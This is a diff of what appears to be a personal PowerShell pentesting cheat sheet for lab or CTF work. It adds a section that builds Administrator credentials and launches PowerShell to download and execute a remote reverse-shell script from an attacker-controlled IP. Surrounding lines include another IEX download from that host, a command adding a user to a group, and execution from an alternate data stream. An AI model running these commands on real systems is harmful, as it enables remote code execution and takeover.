@@ -1261,6 +1261,14 @@ net group <group> <username> /add
 IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:8000/file", "C:\Users\user\Desktop\file")
 Copy-Item \\10.10.14.13\share\file C:\Users\user\Desktop\file
 ```
+## Reverse shell with local authentication
+* assuming you already found credentials (for example by running powerup)
+```powershell
+$pass = ConvertTo-SecureString 'Password!' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('Administrator', $pass)
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.13:8000/rev.ps1')" -Credential $cred
+```
+
 ## Misc Commands
 ### Get-ChildItem
 * ```-Path``` Specifies a path to one or more locations. Wildcards are accepted.
@@ -1283,23 +1291,23 @@ Get-Content -Path file.txt | Measure-Object -Word
 (Get-Content -Path file.txt)[index]
 ```
 
-## Select-String
+### Select-String
 ```
 Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'
 Select-String -Path file.txt -Pattern 'searchstring'
 ```
 
-## Get-FileHash
+### Get-FileHash
 ```
 Get-FileHash -Algorithm MD5 file.txt
 ```
 
-## Strings.exe
+### Strings.exe
 ```
 C:\Tools\strings64.exe -accepteula file.exe
 ```
 
-## Alternate Data Stream (ADS)
+### Alternate Data Stream (ADS)
 Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System). Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.
 
 ```
@@ -1308,7 +1316,7 @@ Get-Item -Path file.exe -Stream *
 wmic process call create $(Resolve-Path file.exe:streamname)
 ```
 
-## Encode Base64
+### Encode Base64
 ```
 $FileName = "C:\Users\Phineas\Desktop\Oracle issue.txt"
 $data = Get-Content $Filename
